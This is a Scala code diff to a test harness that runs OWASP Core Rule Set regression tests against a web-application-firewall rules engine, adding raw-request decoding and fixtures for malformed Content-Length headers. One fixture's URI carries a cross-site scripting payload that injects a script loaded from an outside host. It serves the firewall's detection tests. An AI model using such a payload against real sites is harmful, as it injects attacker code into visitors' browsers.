@@ -7,13 +7,14 @@ import com.cloud.apim.seclang.impl.utils.StatusCodes
 import com.cloud.apim.seclang.model.Disposition.{Block, Continue}
 import com.cloud.apim.seclang.model.{RequestContext, SecRulesEngineConfig}
 import com.cloud.apim.seclang.scaladsl.SecLang
-import play.api.libs.json.{JsArray, JsNull, JsObject, JsValue, Json}
+import play.api.libs.json.{JsArray, JsNull, JsObject, JsString, JsValue, Json}
 
 import java.io.File
 import java.net.{URI, URLDecoder}
 import java.net.http.{HttpClient, HttpRequest, HttpResponse}
 import java.nio.charset.StandardCharsets
 import java.nio.file.Files
+import java.util.Base64
 import java.util.concurrent.atomic.AtomicLong
 import scala.collection.concurrent.TrieMap
 import scala.concurrent.duration.Duration
@@ -130,7 +131,7 @@ object CRSTestUtils {
         |# SecRuleEngine DetectionOnly
         |""".stripMargin
     val config = SecLang.parse(finalRules).right.get
-    val program = SecLang.compile(config).copy(removedRuleIds = Set(920273, 920274)) // TODO: remove and fix
+    val program = SecLang.compile(config)
     SecLang.engine(program, files = files)
   }
 
@@ -174,7 +175,40 @@ object CRSTestUtils {
       }.groupBy(_._1).mapValues(_.map(_._2))
   }
 
-  def requestContext(json: JsValue): RequestContext = {
+  def parseRawHttpRequest(raw: String): JsObject = {
+    val lines = raw.replace("\r\n", "\n").split("\n").toList
+
+    // request line
+    val requestLine :: rest = lines
+    val Array(method, uri, protocol) = requestLine.split(" ", 3)
+
+    // split headers / body
+    val (headerLines, bodyLines) = rest.span(_.nonEmpty)
+
+    val headers = headerLines.flatMap { line =>
+      line.split(":", 2) match {
+        case Array(k, v) => Some(k.trim -> v.trim)
+        case _           => None
+      }
+    }
+
+    Json.obj(
+      "method"   -> method,
+      "uri"      -> uri,
+      "protocol" -> protocol,
+      "headers"  -> JsObject(headers.map { case (k, v) => k -> JsString(v) }),
+      "data"     -> bodyLines.dropWhile(_.isEmpty).mkString("\n")
+    )
+  }
+
+  def requestContext(_json: JsValue): RequestContext = {
+    val json = (_json \ "encoded_request").asOpt[String] match {
+      case None => _json
+      case Some(encodedRaw) => {
+        val enc = Base64.getDecoder.decode(encodedRaw.replaceAll("\\\\n", "").getBytes(StandardCharsets.UTF_8))
+        _json.as[JsObject].deepMerge(parseRawHttpRequest(new String(enc, StandardCharsets.UTF_8)))
+      }
+    }
     val uri = (json \ "uri").asOpt[String].getOrElse("/")
     val port = (json \ "port").asOpt[Int].getOrElse(80)
     val address = (json \ "dest_addr").asOpt[String].getOrElse("127.0.0.1")
@@ -189,8 +223,9 @@ object CRSTestUtils {
     val respBody = encBody.orElse((respStruct \ "body").asOpt[String].map(s => ByteString(s)))
     val finalBody = if (isResponse) respBody else body
     val pfheaders = if (isResponse) respHeaders else headers
+    val autocomplete_headers = (json \ "autocomplete_headers").asOpt[Boolean].getOrElse(true)
     val finalHeaders: Map[String, List[String]] = {
-      if (finalBody.isDefined) {
+      if (finalBody.isDefined && autocomplete_headers) {
         pfheaders + ("Content-Length" -> List(finalBody.get.length.toString))
       } else {
         pfheaders
@@ -216,7 +251,7 @@ object CRSTestUtils {
       cookies = cookies,
       headers = finalHeaders,
       body = finalBody,
-      protocol = (json \ "protocol").asOpt[String].getOrElse("HTTP/1.1"),
+      protocol = (json \ "version").asOpt[String].orElse((json \ "protocol").asOpt[String]).getOrElse("HTTP/1.1"),
     )
   }
 
@@ -330,49 +365,144 @@ object CRSTestUtils {
         |  } ]
         |}""".stripMargin),
     (920100, 13) -> Json.parse("""{
-       |  "test_id" : 13,
-       |  "desc" : "Invalid HTTP Request Line (920100) - Test 2 from old modsec regressions",
-       |  "stages" : [ {
-       |    "input" : {
-       |      "dest_addr" : "127.0.0.1",
-       |      "headers" : {
-       |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
-       |        "Host" : "localhost",
-       |        "Keep-Alive" : "300",
-       |        "Proxy-Connection" : "keep-alive",
-       |        "User-Agent" : "OWASP CRS test agent"
-       |      },
-       |      "method" : "GET",
-       |      "port" : 80,
-       |      "uri" : "\\index.html",
-       |      "version" : "HTTP\\1.0"
-       |    },
-       |    "output" : {
-       |      "log" : { "expect_ids": [920100, 920460] }
-       |    }
-       |  } ]
-       |}""".stripMargin),
+        |  "test_id" : 13,
+        |  "desc" : "Invalid HTTP Request Line (920100) - Test 2 from old modsec regressions",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "headers" : {
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+        |        "Host" : "localhost",
+        |        "Keep-Alive" : "300",
+        |        "Proxy-Connection" : "keep-alive",
+        |        "User-Agent" : "OWASP CRS test agent"
+        |      },
+        |      "method" : "GET",
+        |      "port" : 80,
+        |      "uri" : "\\index.html",
+        |      "version" : "HTTP\\1.0"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920100, 920460] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
     (920100, 15) -> Json.parse("""{
-       |  "test_id" : 15,
-       |  "desc" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
-       |  "stages" : [ {
-       |    "input" : {
-       |      "dest_addr" : "127.0.0.1",
-       |      "method" : "GET",
-       |      "port" : 80,
-       |      "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\\\"javascript:(function () {var x = document.createElement(\\\\\\\"script\\\\\\\");x.src = \\\\\\\"//sdl.me/popup.js?//\\\\\\\";document.childNodes\\[0\\].appendChild(x);}());\\\"\",1000)</script>&//",
-       |      "headers" : {
-       |        "User-Agent" : "OWASP CRS test agent",
-       |        "Host" : "localhost",
-       |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-       |      },
-       |      "version" : "HTTP/1.1"
-       |    },
-       |    "output" : {
-       |       "log" : { "expect_ids": [920100] }
-       |    }
-       |  } ]
-       |}""".stripMargin),
+        |  "test_id" : 15,
+        |  "desc" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "GET",
+        |      "port" : 80,
+        |      "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\\\"javascript:(function () {var x = document.createElement(\\\\\\\"script\\\\\\\");x.src = \\\\\\\"//sdl.me/popup.js?//\\\\\\\";document.childNodes\\[0\\].appendChild(x);}());\\\"\",1000)</script>&//",
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |       "log" : { "expect_ids": [920100] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920160, 1) -> Json.parse("""{
+        |  "test_id" : 1,
+        |  "desc" : "Non digit Content-Length without content-type",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "GET",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Content-Length" : "NotDigits",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "/",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920160] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920160, 2) -> Json.parse("""{
+        |  "test_id" : 2,
+        |  "desc" : "Non digit content-length with content-type",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "POST",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Content-Type" : "application/x-www-form-urlencoded",
+        |        "Content-Length" : "NotDigits",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "/",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920160] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920160, 3) -> Json.parse("""{
+        |  "test_id" : 3,
+        |  "desc" : "Mixed digit and non digit content length",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "method" : "POST",
+        |      "port" : 80,
+        |      "headers" : {
+        |        "User-Agent" : "OWASP CRS test agent",
+        |        "Host" : "localhost",
+        |        "Content-Type" : "application/x-www-form-urlencoded",
+        |        "Content-Length" : "123x",
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        |      },
+        |      "uri" : "/",
+        |      "version" : "HTTP/1.1"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920160] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
+    (920160, 5) -> Json.parse("""{
+        |  "test_id" : 5,
+        |  "desc" : "Content-Length HTTP header is not numeric (920160)  from old modsec regressions",
+        |  "stages" : [ {
+        |    "input" : {
+        |      "dest_addr" : "127.0.0.1",
+        |      "headers" : {
+        |        "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+        |        "Accept-Language" : "en-us,en;q=0.5",
+        |        "Content-Length" : "3;",
+        |        "Content-Type" : "application/x-www-form-urlencoded",
+        |        "Host" : "localhost",
+        |        "Keep-Alive" : "300",
+        |        "Proxy-Connection" : "keep-alive",
+        |        "User-Agent" : "OWASP CRS test agent"
+        |      },
+        |      "method" : "POST",
+        |      "port" : 80,
+        |      "uri" : "/",
+        |      "version" : "HTTP/1.1",
+        |      "data" : "abc"
+        |    },
+        |    "output" : {
+        |      "log" : { "expect_ids": [920160] }
+        |    }
+        |  } ]
+        |}""".stripMargin),
   )
 }
 
@@ -388,8 +518,8 @@ class SecLangCRSTest extends munit.FunSuite {
     case RuleChain(rules) => rules
   }.flatten
 
-  //private val testOnly: List[(String, Int)] = List(("920120", 2))
-  private val testOnly: List[(String, Int)] = List.empty
+  private val testOnly: List[(String, Int)] = List(("920190", 2))
+  //private val testOnly: List[(String, Int)] = List.empty
 
   def writeStats(): Unit = {
     if (testOnly.isEmpty) {
